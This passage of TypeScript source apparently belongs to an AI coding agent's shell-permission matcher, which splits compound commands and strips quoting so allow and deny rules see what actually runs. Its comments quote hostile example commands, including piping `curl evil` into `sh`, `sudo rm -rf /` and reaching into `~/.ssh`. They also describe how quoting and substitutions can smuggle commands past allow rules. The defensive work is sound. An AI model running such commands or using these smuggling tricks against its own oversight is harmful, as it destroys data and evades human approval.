 * rule the user deliberately wrote with quotes still matches. The `*` wildcard
 * survives (it's an ordinary character here — a rule pattern's `*` stays a wildcard
 * for {@link globMatches}). An allow rule reads the command with
 * {@link literalShellUnits} instead, which keeps a quoted `*` apart from a bare one.
 *
 * Not a full shell parser: it strips quoting/escaping so the matcher sees through
 * spelling tricks, and runs per leaf sub-command AFTER {@link splitShellCommand}
 * has already peeled off substitutions and control operators — so it can't merge
 * two commands into one or hide a smuggled command.
 */
function dequoteShell(s: string): string {
  let out = ''
  for (let i = 0; i < s.length; ) {
    const span = readShellSpan(s, i)
    out += span ? span.text : s[i]
    i = span ? span.end : i + 1
  }
  return out
}

/**
 * Match a deny or ask pattern against a shell command (an allow uses
 * {@link shellAllowMatches}). `*` matches any run of characters including `/` (a
 * command is not a path — `/` is just a character), so a deny rule like `*rm -rf*`
 * fires on `rm -rf /tmp/x`. Both sides are first reduced past quoting/escaping (see
 * {@link dequoteShell}) so the rule matches on what actually runs, not how it was
 * spelled. Falls back to a prefix match for convenience ("git" matches "git status").
 */
function shellCommandMatches(pattern: string, command: string): boolean {
  // An empty pattern matches nothing (inert rule), not every command — check the
  // raw pattern before dequoting so a stray-quotes pattern can't be treated as `*`.
  if (!pattern.trim()) return false
  const p = normalizeShellCommand(dequoteShell(pattern))
  const c = normalizeShellCommand(dequoteShell(command))
  if (!p) return false
  if (p === '*') return true
  if (globMatches(p, c)) return true
  return c === p || c.startsWith(`${p} `)
}

/**
 * Whether an EXACT shell rule's `pattern` is `command` itself, compared on what runs
 * (dequoted, whitespace collapsed) like {@link shellCommandMatches}, but with `*` an
 * ordinary character and no prefix extension. A blank pattern is inert.
 */
function shellCommandEquals(pattern: string, command: string): boolean {
  if (!pattern.trim()) return false
  return normalizeShellCommand(dequoteShell(pattern)) === normalizeShellCommand(dequoteShell(command))
}

/**
 * Characters that mean the same to the shell quoted or not, in any position: letters,
 * digits, `_ - . / , : + @ % ^`, and anything non-ASCII. Every other character can
 * change what runs once its quotes come off: whitespace splits a word, `* ? [` glob,
 * `~` and `$` expand, `{` brace-expands, `< >` redirect, `=` assigns, `#` comments.
 */
const SHELL_INERT_CHAR = /^[A-Za-z0-9_\-./,:+@%^\u0080-￿]$/

/**
 * How an ALLOW rule reads a shell command, as a list of units that join into its
 * canonical text. Quotes and backslash escapes come off as in {@link dequoteShell}, so
 * `"rm"`, `r''m`, and `\rm` all read `rm`, but a quoted or escaped character that is
 * not {@link SHELL_INERT_CHAR inert} stays marked as literal (the unit `\c`), and a
 * `$` inside double quotes, which still expands but is not split or globbed, is the
 * unit `"$`. A literal backslash is `\\` and a literal `"` is `\"`, so every unit of two
 * characters starts with `\` or `"` and no other unit is either, and the reading is
 * one-to-one: `rm '*'` (one file named `*`) is `rm \*` and never `rm *` (every file),
 * and `rm -rf '~'` is never `rm -rf ~`.
 *
 * {@link dequoteShell} folds these together on purpose, for deny and ask rules: a
 * respelling must not dodge a deny, and reading too much as the same only blocks
 * more. An allow needs the opposite, since whatever it folds together it approves.
 *
 * A `$'...'` string is decoded as in {@link dequoteShell} and its characters read like
 * any other quoted ones, so `$'\x72m'` is `rm` but `$'*'` is the literal `\*`. A
 * `$"..."` string can be translated into other text when it runs, so its units sit
 * between the markers `"(` and `")` and it reads as itself only.
 *
 * Words split where bash splits them: a run of unquoted blanks (space, tab, or newline;
 * see {@link isShellBlank}) reads as one space, and those at either end are dropped.
 * Quoted or escaped whitespace belongs to its word and reads as written (a quoted space
 * is the unit `\ `), so `rm 'my  file'` is never `rm 'my file'`, `rm \  -rf x` (the
 * arguments " ", `-rf`, `x`) is never `rm \ -rf x` (" -rf", `x`), and
 * `find . -delete \ `, which passes find a lone " ", is never `find . -delete`. Other
 * whitespace (`\r`, a no-break space) is part of a word to bash, and here. A trailing
 * lone backslash, which bash drops, reads as nothing. A word that is only empty quotes
 * (`''`, `""`, `$''`) is still a word to the shell, an empty one, so it is the unit
 * `""` and never folds away: `'' rm -rf /` runs no `rm` at all, and `rm '' -rf x`
 * passes `rm` an empty argument. Empty quotes inside a word add nothing to it (`r''m`
 * is `rm`).
 */
function literalShellUnits(text: string): string[] {
  const units: string[] = []
  const literal = (c: string): void => {
    units.push(SHELL_INERT_CHAR.test(c) ? c : `\\${c}`)
  }
  // Where the current word's units start, and whether it holds a quoted span.
  let wordStart = 0
  let quoted = false
  const endWord = (): void => {
    if (quoted && units.length === wordStart) units.push('""')
    quoted = false
  }
  // The double-quoted string opening at `text[i]`; returns the index past its close.
  const doubleQuoted = (i: number): number => {
    for (i += 1; i < text.length && text[i] !== '"'; ) {
      if (text[i] === '\\' && i + 1 < text.length && '"`$\\\n'.includes(text[i + 1])) {
        if (text[i + 1] !== '\n') literal(text[i + 1])
        i += 2
      } else {
        if (text[i] === '$') units.push('"$')
        else literal(text[i])
        i += 1
      }
    }
    return i + 1
  }
  for (let i = 0; i < text.length; ) {
    const c = text[i]
    if (c === '$' && text[i + 1] === '$') {
      units.push('$', '$')
      i += 2
    } else if (c === '$' && text[i + 1] === "'") {
      const q = readAnsiCQuote(text, i)
      for (let k = 0; k < q.text.length; k++) literal(q.text[k])
      quoted = true
      i = q.end
    } else if (c === '$' && text[i + 1] === '"') {
      units.push('"(')
      i = doubleQuoted(i + 1)
      units.push('")')
    } else if (c === '\\') {
      if (i + 1 < text.length) literal(text[i + 1])
      i += 2
    } else if (c === '"') {
      i = doubleQuoted(i)
      quoted = true
    } else if (c === "'") {
      i += 1
      while (i < text.length && text[i] !== "'") {
        literal(text[i])
        i += 1
      }
      quoted = true
      i += 1
    } else if (isShellBlank(c)) {
      endWord()
      if (units.length && units[units.length - 1] !== ' ') units.push(' ')
      wordStart = units.length
      i += 1
    } else {
      units.push(c)
      i += 1
    }
  }
  endWord()
  if (units[units.length - 1] === ' ') units.pop()
  return units
}

/**
 * Any run of whole {@link literalShellUnits} units: a marked `\c` or a `"`-led unit is
 * never split, so a wildcard can't stop inside one and leave the rest of the pattern
 * matching out of step with the command's units.
 */
const SHELL_UNITS_RE = String.raw`(?:[\\"][\s\S]|[^\\"])*`

/** Whether a {@link literalShellUnits} unit is a `*`, which an allow pattern reads as its wildcard. */
function isShellStarUnit(u: string | undefined): boolean {
  return u === '*' || u === '\\*'
}

/**
 * {@link shellCommandMatches} for an ALLOW rule: the pattern and the command are
 * compared as {@link literalShellUnits}, so a quoted `*` or `~` in the command is not
 * the bare one a pattern names (`rm -rf '~'` covers `rm -rf '~' x`, never `rm -rf ~`).
 * Every `*` in the pattern is still its wildcard, quoted or not, so a hand-written
 * `git commit -m "*"` covers any message; a literal `*` takes an exact rule.
 *
 * A pattern ending in a lone backslash matches nothing. Houston never saves one (see
 * {@link shellRuleText}), but earlier versions trimmed `find . -delete \ ` to
 * `find . -delete \` before saving it, and bash drops that backslash, so the text reads
 * as `find . -delete`: a harmless command's approval that would allow a destructive one.
 * Any other rule an earlier version saved with its quoted whitespace collapsed reads as
 * its text does (`rm 'my file'` allows that file, not `rm 'my  file'`).
 */
function shellAllowMatches(pattern: string, command: string): boolean {
  if (!pattern.trim() || endsInLoneBackslash(pattern)) return false
  const p = literalShellUnits(pattern)
  if (!p.length) return false
  const c = literalShellUnits(command).join('')
  let re = ''
  for (const [i, u] of p.entries()) {
    if (!isShellStarUnit(u)) re += escapeRegExp(u)
    else if (!isShellStarUnit(p[i - 1])) re += SHELL_UNITS_RE
  }
  if (new RegExp(`^${re}$`).test(c)) return true
  const prefix = p.join('')
  return c === prefix || c.startsWith(`${prefix} `)
}

/**
 * {@link shellCommandEquals} for an ALLOW rule: the same command read as
 * {@link literalShellUnits}, so an exact `rm '*'` never allows `rm *`. A pattern ending
 * in a lone backslash matches nothing, as in {@link shellAllowMatches}.
 */
function shellAllowEquals(pattern: string, command: string): boolean {
  if (!pattern.trim() || endsInLoneBackslash(pattern)) return false
  const p = literalShellUnits(pattern).join('')
  return p !== '' && p === literalShellUnits(command).join('')
}

/**
 * First matching rule's action for a single shell sub-command, or null. An allow rule
 * reads the command as written, through {@link literalShellUnits}; a deny or ask rule
 * reads it with all its whitespace collapsed (see {@link normalizeShellCommand}) and
 * through {@link dequoteShell}: a quoted `*`, `~`, or space is the bare one to a deny,
 * never to an allow.
 */
function matchOneShell(rules: PermissionRule[], command: string): PermissionRule['action'] | null {
  const norm = normalizeShellCommand(command)
  for (const r of rules) {
    if (r.tool && r.tool !== '*' && r.tool !== 'run_shell') continue
    const match = r.match ?? ''
    const hit =
      r.action === 'allow'
        ? r.exact
          ? shellAllowEquals(match, command)
          : shellAllowMatches(match, command)
        : r.exact
          ? shellCommandEquals(match, norm)
          : shellCommandMatches(match, norm)
    if (hit) return r.action
  }
  return null
}

/**
 * Best-effort split of a shell command into the simple commands it would actually
 * run, so a permission rule can be required to cover EVERY one. Splits on the
 * control operators (`&&`, `||`, `;`, `|`, `&`, newline) and additionally pulls
 * out the bodies of command substitutions (`$(...)`, backticks) AND process
 * substitutions (`<(...)`, `>(...)`) — all of which run their own commands,
 * including when nested. NOT a full shell parser — it deliberately over-segments
 * (more pieces ⇒ stricter), so an `allow` rule can't auto-approve a compound
 * command that smuggles in an unapproved sub-command.
 *
 * A hand-written scanner (not one regex) is used because the substitution bodies
 * nest: `$(rm -rf "(x)")` has a paren inside, and `<(diff <(a) <(b))` nests three
 * deep. The previous `\$\(([^()]*)\)` regex couldn't span an inner `(`, so a body
 * containing one leaked back into the outer command and matched a narrow `allow`
 * rule (e.g. `echo *`), auto-approving the smuggled command; `<(...)`/`>(...)`
 * were not recognized at all.
 *
 * Each segment also has its compound-command scaffolding peeled off (see
 * {@link stripShellScaffolding}), so `for f in *; do rm -rf ~; done` yields `rm -rf ~`,
 * not `do rm -rf ~` (which a deny on `rm` missed and a junk allow on `do` approved).
 *
 * A line continuation (backslash-newline) is no break to bash: it is deleted, so
 * `r\<newline>m -rf x` runs `rm -rf x`, which a split at that newline reads as `r\` and
 * `m -rf x`, and a deny on `*rm -rf*` matches neither. So a command holding one is read
 * twice, as written and with its continuations joined (see
 * {@link joinLineContinuations}), and the segments of the second reading not in the
 * first are added. A deny fires on a segment of either, so one that fires on a piece as
 * written still does, and an allow must cover both: allows on the pieces `r` and
 * `m -rf x` never approve `rm -rf x`.
 *
 * A newline inside quotes still splits, though to bash it is part of a word. Each piece
 * must then be allowed (stricter), and a deny sees both, missing only a pattern that
 * spans the newline, which bash runs as a word holding a newline (`r"<newline>"m` is the
 * program `r<newline>m`, not `rm`). Not splitting there would take reading the quoting
 * as bash does, and a quote in a comment or a heredoc body is not one: a reader thrown
 * out of step by it would take the next command for quoted text and hide it from an
 * allow.
 */
export function splitShellCommand(command: string): string[] {
  return shellSegments(command).map((s) => s.text)
}

/** A sub-command {@link splitShellCommand} yields, and where its text came from. */
interface ShellSegment {
  text: string
  /**
   * A substitution was lifted out of this sub-command, leaving a blank where its output
   * goes, so the text no longer shows what bash runs: `cd $(echo ~/).ssh` reads `cd .ssh`.
   */
  lifted: boolean
}

/** {@link splitShellCommand}, with each sub-command's {@link ShellSegment.lifted} flag. */
function shellSegments(command: string): ShellSegment[] {
  const segments: ShellSegment[] = []
  collectShellSegments(command, segments, 0)
  const joined = joinLineContinuations(command)
  if (joined !== command) {
    // The joined reading's sub-commands not already read as written. A duplicate keeps
    // the stricter `lifted` of the two, so neither reading loosens the other.
    const byText = new Map(segments.map((seg) => [seg.text, seg]))
    const more: ShellSegment[] = []
    collectShellSegments(joined, more, 0)
    for (const seg of more) {
      const prior = byText.get(seg.text)
      if (prior) {
        if (seg.lifted) prior.lifted = true
        continue
      }
      segments.push(seg)
      byText.set(seg.text, seg)
    }
  }
  return segments.length ? segments : [{ text: command.trim(), lifted: false }]
}

/**
 * `command` with every line continuation (a backslash-newline) deleted, as bash deletes
 * one before it reads words. Backslashes pair left to right, so `\\` then a newline is an
 * escaped backslash and a real line break, not a continuation.
 *
 * Every pair goes, quoted or not, which also joins one that bash keeps: in single quotes
 * or `$'...'`, in a comment, or in a heredoc body with a quoted delimiter. Telling those
 * apart takes a full parser, since a quote inside a comment or a heredoc body is not a
 * quote, and a reader that took one for a quote would leave the next continuation in
 * place. Joining too much is safe where this is used, since {@link splitShellCommand}
 * keeps the reading as written too, and a string a nested shell runs
 * (`sh -c 'r\<newline>m -rf x'`) is joined the same way when it runs.
 */
function joinLineContinuations(command: string): string {
  return command.replace(/\\[\s\S]/g, (pair) => (pair === '\\\n' ? '' : pair))
}

/**
 * The control operators a command is split on: `||`, `&&`, `;`, newline, `|`, and a
 * lone `&` (background). An `&` that belongs to a file-descriptor redirection is NOT
 * an operator and must not split: `2>&1` / `>&2` / `<&3` (preceded by `>`/`<`) and
 * `&>file` / `&>>file` (followed by `>`). Splitting there cut `cmd > log 2>&1` into
 * `cmd > log 2>` and a phantom `1` command, which then got persisted as an "Always
 * allow" rule matching `1`. Bash parses those as redirections, so not splitting them
 * mirrors what actually runs; an operand after `>&` is a file target, never a command.
 */
const SHELL_CONTROL_OPERATOR = /\|\||&&|[;\n|]|(?<![<>])&(?!>)/

/** Cap on substitution nesting so a pathologically deep command can't recurse forever. */
const MAX_SUBST_DEPTH = 32

/**
 * Peel command/process-substitution bodies out of `command` — recursing so a body
 * that itself chains commands or nests further substitutions is fully expanded —
 * then split the residual on the shell control operators. Nested parens are
 * balanced so substitution boundaries are found correctly.
 */
function collectShellSegments(command: string, segments: ShellSegment[], depth: number): void {
  const recurse = (inner: string): void => {
    if (depth < MAX_SUBST_DEPTH) {
      collectShellSegments(inner, segments, depth + 1)
    } else {
      // Too deep to keep expanding — surface the body opaquely so it still can't
      // match a narrow allow rule (over-segment ⇒ stricter, never looser).
      const t = inner.trim()
      if (t) segments.push({ text: t, lifted: false })
    }
  }
  let outer = ''
  const blanks: number[] = [] // where in `outer` a lifted substitution left its blank
  for (let i = 0; i < command.length; ) {
    const two = command.slice(i, i + 2)
    if (two === '$(' || two === '<(' || two === '>(') {
      const close = matchClosingParen(command, i + 1)
      if (close === -1) {
        // Unbalanced (a shell syntax error) — treat the rest as a command body too
        // so nothing hides behind the unterminated opener, then stop scanning.
        recurse(command.slice(i + 2))
        blanks.push(outer.length)
        outer += ' '
        break
      }
      recurse(command.slice(i + 2, close))
      blanks.push(outer.length)
      outer += ' '
      i = close + 1
    } else if (command[i] === '`') {
      const close = command.indexOf('`', i + 1)
      if (close === -1) {
        recurse(command.slice(i + 1))
        blanks.push(outer.length)
        outer += ' '
        break
      }
      recurse(command.slice(i + 1, close))
      blanks.push(outer.length)
      outer += ' '
      i = close + 1
    } else {
      outer += command[i]
      i += 1
    }
  }
  // Split as `outer.split(SHELL_CONTROL_OPERATOR)` would, keeping each part's offsets.
  const operator = new RegExp(SHELL_CONTROL_OPERATOR.source, 'g')
  let start = 0
  const push = (end: number): void => {
    const text = stripShellScaffolding(outer.slice(start, end))
    if (text) segments.push({ text, lifted: blanks.some((b) => b >= start && b < end) })
  }
  for (let m = operator.exec(outer); m !== null; m = operator.exec(outer)) {
    push(m.index)
    start = m.index + m[0].length
  }
  push(outer.length)
}

/** Reserved words / grouping that may precede a command without being one. */
const SHELL_LEAD_KEYWORDS = new Set(['do', 'then', 'else', 'elif', 'if', 'while', 'until', '!', '{', 'time', 'coproc'])
/** Words that close a compound command; a segment starting with one runs nothing. */
const SHELL_CLOSERS = new Set(['done', 'fi', 'esac', '}', ')'])
/** A function-definition head: `name() {` or `function name [()] {`. */
const SHELL_FUNC_DEF = /^(?:function\s+[A-Za-z_][\w.:-]*(?:\s*\(\s*\))?|[A-Za-z_][\w.:-]*\s*\(\s*\))\s*/

/**
 * Strip the compound-command scaffolding around the simple command in one segment:
 * leading reserved words (`do`, `then`, `if`, `while`, `!`, `time`, …), a subshell
 * `(` or group `{`, and a function-definition head. Returns '' for a segment that
 * runs nothing itself: a closer (`done`, `fi`, `}`), a bare `else`, or a `for NAME` /
 * `select NAME` header (its word list can't execute; substitutions in it were already
 * pulled out). Bash rejects anything following a closer, so `done rm` never runs `rm`.
 *
 * `case` is deliberately NOT handled: its `pattern)` arms sit in front of the commands
 * and can't be told apart from them without a real parser, so a case segment stays
 * whole and gated (over-segmenting is the safe direction).
 *
 * Only unquoted blanks come off the ends (see {@link trimShellBlanks}): the escaped
 * space in `find . -delete \ ` is an argument, and so is a trailing no-break space.
 * Whitespace bash doesn't split on also stays at the start when no scaffolding precedes
 * the command.
 */
function stripShellScaffolding(segment: string): string {
  const text = trimShellBlanks(segment)
  const lead = text.trimStart()
  let s = lead
  for (;;) {
    const before = s
    s = s.replace(SHELL_FUNC_DEF, '')
    // A subshell `(cmd`, but not arithmetic `((…))`, which runs no command.
    if (s.startsWith('(') && !s.startsWith('((')) s = s.slice(1).trimStart()
    const word = /^(\S+)(?:\s+|$)/.exec(s)
    if (word && SHELL_LEAD_KEYWORDS.has(word[1])) {
      s = s.slice(word[0].length)
      if (word[1] === 'time') s = s.replace(/^-p(?:\s+|$)/, '')
    }
    if (s === before) break
  }
  const first = /^\S+/.exec(s)?.[0]
  if (!first || SHELL_CLOSERS.has(first)) return ''
  // `for NAME …` / `select NAME …` only; a C-style `for ((…))` header stays gated.
  if (/^(?:for|select)\s+[A-Za-z_]\w*(?:\s|$)/.test(s)) return ''
  return s === lead ? text : s
}

/** Index of the `)` that closes the `(` at `open` (honoring nesting), or -1 if unbalanced. */
function matchClosingParen(s: string, open: number): number {
  let depth = 0
  for (let i = open; i < s.length; i++) {
    if (s[i] === '(') depth += 1
    else if (s[i] === ')') {
      depth -= 1
      if (depth === 0) return i
    }
  }
  return -1
}

/** Directory-change builtins: their only effect is the cwd. */
const CWD_BUILTINS = new Set(['cd', 'pushd', 'popd'])

/**
 * Whether a sub-command runs a directory-change builtin (`cd`/`pushd`/`popd`), judged on
 * the word bash runs: `"cd"k` is the program `cdk`, while `\cd` and `$'cd'` are `cd`.
 */
function isCwdOnly(command: string): boolean {
  const first = tokenizeShellCommand(command)[0]
  return first !== undefined && CWD_BUILTINS.has(first)
}

/**
 * A character that makes bash expand, split, or redirect a word (`$`, a backtick, a
 * glob, a brace, an operator, a `#` comment), or that a word holds only when it was
 * quoted or escaped (a blank, a backslash, a quote).
 */
const SHELL_EXPANDING_CHAR = /[\s$`*?[\]{}()<>|&;!#\\'"]/

/**
 * Whether a `cd` or `pushd`, given as bash words, names the directory it moves to in
 * its words alone: exactly one argument after any `--` (and `-L` / `-P` on `cd`), with
 * nothing bash would expand. Otherwise bash takes the directory from somewhere the
 * escape check can't see: a bare `cd` goes to `$HOME`; `cd -` and `~-` to `$OLDPWD`;
 * `~+` is `$PWD` and `~user` another home; `$PWD/..` and a substitution expand; `.[.]`
 * and `{..,}` expand to `..`; and a `popd`, or a `pushd` with no directory, takes one
 * off the directory stack. While `CDPATH` is set, bash looks a relative name up there
 * before the cwd, so only a name led by `/`, `./`, or `../` (or `.`, `..`, `~`) counts.
 */
function namesItsDirectory(words: string[]): boolean {
  const [prog, ...args] = words
  if (prog !== 'cd' && prog !== 'pushd') return false
  let i = 0
  for (; args[i]?.startsWith('-'); i++) {
    if (args[i] === '--') {
      i++
      break
    }
    if (prog !== 'cd' || !/^-[LP]+$/.test(args[i])) return false // `-`, `-n`, `-1`, …
  }
  if (args.length - i !== 1) return false
  const dir = args[i]
  if (!dir || /^[-+]/.test(dir) || SHELL_EXPANDING_CHAR.test(dir)) return false
  if (dir.startsWith('~') && dir !== '~' && !dir.startsWith('~/')) return false
  return !process.env.CDPATH || /^(?:\/|~|\.\.?(?:\/|$))/.test(dir)
}

/**
 * Whether a sub-command is a directory change {@link matchShellRule} may skip: a `cd` or
 * `pushd` that {@link namesItsDirectory}, into a directory the escape check finds
 * inside `roots` (a relative one is read against the workspace root, as that check
 * reads every relative path). Without `roots`, only the first half is judged. Never one
 * a substitution was lifted out of (see {@link ShellSegment.lifted}): its output joins
 * the directory (`cd $(echo ~/).ssh`, `cd src$(echo /../..)`) where no check sees it.
 */
function isWorkspaceCwdChange(segment: ShellSegment, roots?: string[]): boolean {
  if (segment.lifted) return false
  const command = normalizeShellCommand(segment.text)
  if (!namesItsDirectory(tokenizeShellCommand(command))) return false
  return roots === undefined || !shellReferencesExternalPath(command, roots)
}

/**
 * Resolve permission rules for a `run_shell` call across ALL its chained
 * sub-commands. An `allow` verdict is returned only when EVERY (gated) sub-command is
 * explicitly allowed; any denied sub-command denies the whole call; otherwise the
 * verdict is `ask` (a sub-command asked) or null (fall through to the policy,
 * which prompts for shell). This stops a narrow allow-rule (e.g. `git status*`)
 * from auto-approving `git status && curl evil | sh`.
 *
 * A `cd` or `pushd` sub-command that provably lands *in the workspace* changes nothing a
 * rule guards (what runs after it, in this call or a later one that keeps the cwd,
 * still runs in the workspace), so an *unmatched* one does not block auto-approval.
 * That lets a generalized rule like `npm install` cover the whole of
 * `cd /repo && npm install` without also needing a rule for the `cd` (agents prepend
 * one constantly). Provably means its words name the directory and that directory is
 * in the workspace (see {@link isWorkspaceCwdChange}). Any other directory change stays
 * gated: one that ESCAPES the workspace, so `cd ~/.ssh && <allowed-cmd>` still prompts
 * rather than slipping past the workspace-escape tripwire on the strength of the
 * allowed command alone, and one whose directory bash finds elsewhere (a bare `cd`,
 * `cd -`, `popd`, `cd $PWD/..`, `cd .[.]`), where the tripwire can't see where it
 * lands. A command that is ONLY skipped directory changes still falls through to the
 * policy; an explicit deny on the `cd` still denies.
 */
export function matchShellRule(
  rules: PermissionRule[],
  command: string,
  roots: string[] = []
): PermissionRule['action'] | null {
  let allAllow = true
  let anyAsk = false
  let sawGated = false
  for (const seg of shellSegments(command)) {
    const action = matchOneShell(rules, seg.text)
    if (action === 'deny') return 'deny' // a denied sub-command denies the whole call
    // A directory change that provably stays in the workspace is plumbing, not a gated command.
    if (action == null && isWorkspaceCwdChange(seg, roots)) continue
    sawGated = true
    if (action === 'allow') continue
    if (action === 'ask') anyAsk = true
    allAllow = false // 'ask' or unmatched — not auto-approvable
  }
  if (!sawGated) return null // only directory changes — let the policy decide
  if (allAllow) return 'allow'
  return anyAsk ? 'ask' : null
}

/**
 * Resolve permission rules for a call. Returns the first matching rule's action,
 * or null when no rule matches (caller falls back to the approval policy). For
 * `run_shell`, the command is split into its chained sub-commands and an `allow`
 * is honored only when every one is allowed (see {@link matchShellRule}).
 */
export function matchRule(
  rules: PermissionRule[] | undefined,
  toolName: string,
  subject: string,
  roots: string[] = []
): PermissionRule['action'] | null {
  if (!rules?.length) return null
  if (toolName === 'run_shell') return matchShellRule(rules, subject, roots)
  if (toolName === 'apply_patch') return matchPatchRule(rules, subject, roots)
  return matchOne(rules, toolName, subject, roots)
}

/**
 * Resolve rules for an `apply_patch` call against every file it touches, the way
 * {@link matchShellRule} treats a compound command: a denied file denies the patch,
 * an `ask` on any file asks, and an `allow` is honored only when every file is allowed,
 * so one allowed file can't carry the others past a rule or the approval policy.
 */
function matchPatchRule(
  rules: PermissionRule[],
  subject: string,
  roots: string[]
): PermissionRule['action'] | null {
  const paths = patchSubjectPaths(subject)
  if (paths.length <= 1) return matchOne(rules, 'apply_patch', paths[0] ?? '', roots)
  let allAllow = true
  let anyAsk = false
  for (const path of paths) {
    const action = matchOne(rules, 'apply_patch', path, roots)
    if (action === 'deny') return 'deny'
    if (action === 'ask') anyAsk = true
    if (action !== 'allow') allAllow = false
  }
  if (allAllow) return 'allow'
  return anyAsk ? 'ask' : null
}

/** A leading `VAR=value` env-assignment token, which precedes the real program. */
const ENV_ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/

/** A bare sub-command verb like `status` or `install` — not a flag, path, or value. */
const SUBCOMMAND_VERB = /^[a-z][a-z0-9:._-]*$/i

/**
 * Command wrappers whose second token is itself a program, not a sub-command verb.
 * Generalizing `<wrapper> <program>` to a two-token prefix would broaden a specific
 * "Always allow" into a blanket pass — e.g. `sudo rm -rf /tmp/build` collapsing to a
 * `sudo rm` rule that then auto-approves `sudo rm -rf /`. These stay verbatim.
 */
const COMMAND_WRAPPERS = new Set([
  'sudo',
  'doas',
  'env',
  'xargs',
  'nohup',
  'timeout',
  'time',
  'nice',
  'ionice',
  'stdbuf',
  'setsid',
  'command',
  'exec',
  'watch'
])

/** Programs that just slice their input, collapsed by {@link isCountOnlyPager}. */
const PAGERS = new Set(['head', 'tail'])

/** A head/tail count: `-30`, `+5`, `-n30`, `-c+5`, `--lines=30`, with optional size suffix. */
const PAGER_COUNT_FLAG = /^(?:[-+]\d+|-[nc][+-]?\d+[a-z]*|--(?:lines|bytes)=[+-]?\d+[a-z]*)$/i
const PAGER_COUNT_VALUE = /^[+-]?\d+[a-z]*$/i
/** head/tail flags that take no value and touch no file. */
const PAGER_BARE_FLAGS = new Set(['-q', '-v', '--quiet', '--silent', '--verbose'])

/** Whether `tokens` is `head`/`tail` with only count/quiet flags and no file operand. */
function isCountOnlyPager(tokens: string[]): boolean {
  if (!PAGERS.has(tokens[0])) return false
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]
    if (PAGER_COUNT_FLAG.test(t) || PAGER_BARE_FLAGS.has(t)) continue
    // `-n 30` / `--lines 30`: the flag's value is the next token.
    if (['-n', '-c', '--lines', '--bytes'].includes(t) && PAGER_COUNT_VALUE.test(tokens[i + 1] ?? '')) {
      i += 1
      continue
    }
    return false // a file operand, redirect, or flag we don't model: keep exact
  }
  return true
}

/**
 * The permission-rule pattern(s) to persist when the user picks "Always allow" on a
 * `run_shell` call. Storing the exact command bakes in one-off arguments (and the
 * `cd <dir> &&` prelude agents habitually prepend), so every near-identical command
 * spawns its own rule and the Permissions panel fills with noise. Instead this returns
 * a small set of generalized, per-sub-command prefixes:
 *
 * - The command is split into its chained sub-commands (the same split the matcher
 *   uses), so `cd /repo && npm install foo` yields a rule for `npm install`, not the
 *   whole line.
 * - A directory change the matcher skips (a `cd <dir>` into the workspace, see
 *   {@link isWorkspaceCwdChange}) is dropped: it needs no rule and only adds noise. Any
 *   other (a bare `cd`, `cd -`, `popd`, `cd $DIR`, and, given the run's `roots`, a `cd`
 *   out of them) is kept whole, since the matcher gates it, and saved exact (see
 *   {@link shellAllowRule}). Without `roots` (cleaning up saved rules), a `cd` that
 *   names its directory is dropped wherever it points.
 * - A sub-command shaped `<program> <verb> …` where `<verb>` is a bare word (e.g.
 *   `git status`, `npm install`) generalizes to that two-token prefix, so repeated
 *   invocations with different trailing arguments collapse onto one rule.
 * - Anything else — a lone program, a program whose next token is a flag/path, an
 *   env-prefixed command, or a command wrapper (`sudo`/`env`/`xargs`/… — see
 *   {@link COMMAND_WRAPPERS}) whose second token is another program — is kept verbatim,
 *   so raw operations like `cat x`, `rm -rf y`, or `sudo rm -rf z` are NOT silently
 *   broadened to `cat`/`rm`/`sudo rm`. A program spelled with `*` (`./*.sh run`, or
 *   `$'\x2a'` decoded) is kept verbatim too, since its two-token prefix would be a glob
 *   over other programs.
 *   Only a verbatim pattern can therefore hold `*`, and that one is saved exact (see
 *   {@link shellAllowRule}). So is a program whose quoting or escaping the prefix would
 *   drop (`'~/bin/x' status`, `\~/bin/x status`, `"my tool" status`): written bare, the
 *   prefix would name a different program, and would not cover the command it was
 *   saved for.
 * - The program and verb are the words bash runs (see {@link tokenizeShellCommand}), so
 *   a quoted or escaped `cd` or wrapper is the one it runs: `\sudo rm -rf x` stays
 *   verbatim rather than saving a `\sudo rm` prefix that covers `sudo rm -rf /`, and
 *   `"cd"k deploy` is the command `cdk deploy`, not a dropped `cd`. A word shaped like
 *   `VAR=value` once its quotes come off (`F"OO"=1`) stays verbatim too.
 * - A verbatim sub-command is saved with only its unquoted blanks collapsed (see
 *   {@link shellRuleText}): `rm   'my  file'` is saved as `rm 'my  file'`, and
 *   `find . -delete \ ` keeps the escaped space that makes it a different command
 *   from `find . -delete`.
 *
 * - A `head`/`tail` whose arguments are only line/byte counts (`tail -60`, `head -c 4000`,
 *   `head -n 30`) collapses to the bare program: it's slicing piped output, and keeping
 *   the count mints a new rule per number. One with a file operand stays exact, so a
 *   rule for paging stdin is never broadened into one naming a file.
 *
 * Used only for the ALLOW case; a deny is always stored exactly (a broadened deny is
 * dangerous). Never returns an empty list.
 */
export function shellRulePatterns(command: string, roots?: string[]): string[] {
  const patterns = new Set<string>()
  for (const seg of shellSegments(command)) {
    const text = shellRuleText(seg.text)
    const tokens = tokenizeShellCommand(text)
    const prog = tokens[0]
    // An empty program (`'' rm -rf x`) is still a sub-command to cover, not one to drop.
    if (prog === undefined || isWorkspaceCwdChange(seg, roots)) continue
    const verb = tokens[1]
    if (CWD_BUILTINS.has(prog)) {
      patterns.add(text)
    } else if (isCountOnlyPager(tokens)) {
      patterns.add(prog)
    } else if (
      !ENV_ASSIGN.test(prog) &&
      !COMMAND_WRAPPERS.has(prog) &&
      !holdsShellStar(prog) &&
      verb &&
      SUBCOMMAND_VERB.test(verb) &&
      shellAllowMatches(`${prog} ${verb}`, text)
    ) {
      patterns.add(`${prog} ${verb}`)
    } else {
      patterns.add(text)
    }
  }
  if (patterns.size === 0) patterns.add(shellRuleText(command))
  return [...patterns]
}

/**
 * Whether a shell pattern holds a `*` that an allow would read as its wildcard: one
 * written out, or one a `$'...'` escape spells (`rm $'\x2a'`).
 */
function holdsShellStar(s: string): boolean {
  return s.includes('*') || literalShellUnits(s).some(isShellStarUnit)
}

/**
 * The `run_shell` allow rule saved for one pattern from {@link shellRulePatterns}. A
 * pattern holding `*` (see {@link holdsShellStar}) is a sub-command kept verbatim, and
 * the matcher would read that `*` as a wildcard: approving `rm *` would allow
 * `rm -rf ~`, and approving `find . -name "*.ts"` would allow
 * `find . -name x -delete -name y.ts`. So it is `exact`, covering the approved
 * sub-command only. So is a directory change: as a prefix, `cd` would cover every
 * `cd` and `cd -` would cover `cd - x`. Every other pattern keeps its prefix meaning
